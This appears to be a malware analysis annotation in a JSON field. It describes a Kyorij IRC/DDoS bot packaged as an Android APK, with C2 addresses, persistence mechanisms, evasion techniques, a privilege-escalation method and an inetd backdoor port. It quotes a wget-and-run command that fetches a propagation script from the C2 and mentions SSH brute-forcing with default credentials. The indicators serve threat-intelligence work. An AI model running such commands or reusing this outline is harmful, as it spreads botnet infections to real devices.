 "comment": "Kyorij IRC/DDoS bot packaged as Android APK (com.chingusapk.juan, label \"System\").\r\nNative payload libbot.so (arm64/armv7/x86).\r\n\r\nIRC C2: 38.87.117.7:6767 via bobbarnacle.duckdns.org.\r\nChannel: #op-cascade-2024.\r\nHTTP beacon pool: 7 rotating domains (/api/v1/beacon).\r\n\r\nPropagation:\r\n- Self-spread via bins.sh (multi-arch): cd /tmp; wget http://<C2>/bins.sh; sh bins.sh\r\n- Targets ARM, MIPS, x86, x86_64, PPC, m68k, SH4 (IoT + Linux servers)\r\n- Brute-force SSH with default credentials (ec2-user, passw0rd, password...)\r\n- BOTKILLER: kills competing malware/bots on infected host\r\n- Android delivery: via ADB/root dropper pulling APK over raw socket\r\n\r\nPersistence:\r\n- Linux: init.d, dhclient hooks, systemd timers, /var/backups/.network-dispatch\r\n- Android: boot receiver, foreground service\r\n\r\nKernel-level evasion: user/net namespaces for CAP_NET_RAW, XFRM/espintcp, AF_ALG.\r\nLPE module: /etc/passwd corruption via userns primitive (staged, verified via getent).\r\ninetd backdoor: port 48102.\r\n\r\nSigned with default Android debug cert (not a pivot).",
